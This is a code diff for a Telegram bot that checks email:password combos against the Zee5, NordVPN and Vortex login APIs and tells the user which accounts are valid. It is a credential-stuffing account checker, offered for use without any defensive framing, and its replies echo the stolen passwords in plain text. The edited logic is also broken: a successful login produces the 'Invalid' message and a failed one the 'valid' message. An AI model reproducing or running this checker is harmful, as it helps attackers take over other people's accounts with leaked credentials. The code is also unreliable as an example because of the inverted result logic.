@@ -146,19 +146,29 @@ async def Devsexpo(event):
         meke = requests.get(
             f"https://userapi.zee5.com/v1/user/loginemail?email={email}&password={password}"
         ).json()
-        beautiful = f"""
-💖 Checked Zee5 Account
-Combo: {email}:{password}
-Email: {email}
-Password:- {password}
-Response:- This Account Is Invalid.
+        beautifuln = f"""
+💖 **Checked Zee5 Account**
+**Combo:** {email}:{password}
+**Email:** {email}
+**Password:-** {password}
+**Response:-** This Account Is valid. 😀
 
-✅Better Luck Next Time, Thanks For Using Me. 
-Bot Made By @DevsExpo"""
+**✅Better Luck Next Time, Thanks For Using Me. 
+Bot Made By @DevsExpo**"""
+
+        beautiful = f"""
+💖 **Checked Zee5 Account**
+**Combo:** {email}:{password}
+**Email:** {email}
+**Password:-** {password}
+**Response:-** This Account Is Invalid.😔
+
+**✅Better Luck Next Time, Thanks For Using Me. 
+Bot Made By @DevsExpo**"""
         if meke.get("token"):
-            await event.reply("`Yay, This is A Hit`")
-        else:
             await event.reply(beautiful)
+        else:
+            await event.reply(beautifuln)
 
 
 @UltraBot.on(events.NewMessage(pattern="^/nord ?(.*)"))
@@ -242,10 +252,29 @@ async def Devsexpo(event):
             headers=data,
             json=sedlyf,
         ).json()
+        beautifuln = f"""
+💖 **Checked Nord Account**
+**Combo:** {email}:{password}
+**Email:** {email}
+**Password:-** {password}
+**Response:-** This Account Is valid. 😀
+
+**✅Better Luck Next Time, Thanks For Using Me. 
+Bot Made By @DevsExpo**"""
+
+        beautiful = f"""
+💖 **Checked Nord Account**
+**Combo:** {email}:{password}
+**Email:** {email}
+**Password:-** {password}
+**Response:-** This Account Is Invalid.😔
+
+**✅Better Luck Next Time, Thanks For Using Me. 
+Bot Made By @DevsExpo**"""
         if meke.get("token"):
-            await event.reply("`Yay, This is A Hit.`")
+            await event.reply(beautiful)
         else:
-            await event.reply("`So Sad, This is Invalid Account.`")
+            await event.reply(beautifuln)
 
 
 @UltraBot.on(events.NewMessage(pattern="^/vortex ?(.*)"))
@@ -325,10 +354,29 @@ async def Devsexpo(event):
         meke = requests.post(
             url="https://vortex-api.gg/login", headers=data2, json=sedlyf
         ).json()
+        beautifuln = f"""
+💖 **Checked Vortex Account**
+**Combo:** {email}:{password}
+**Email:** {email}
+**Password:-** {password}
+**Response:-** This Account Is valid. 😀
+
+**✅Better Luck Next Time, Thanks For Using Me. 
+Bot Made By @DevsExpo**"""
+
+        beautiful = f"""
+💖 **Checked Vortex Account**
+**Combo:** {email}:{password}
+**Email:** {email}
+**Password:-** {password}
+**Response:-** This Account Is Invalid.😔
+
+**✅Better Luck Next Time, Thanks For Using Me. 
+Bot Made By @DevsExpo**"""
         if meke.get("token"):
-            await event.reply("`Yay, This is A Hit.`")
+            await event.reply(beautiful)
         else:
-            await event.reply("`So Sad, This is Invalid Account.`")
+            await event.reply(beautifuln)
 
 
 @UltraBot.on(events.NewMessage(func=lambda e: e.is_private))
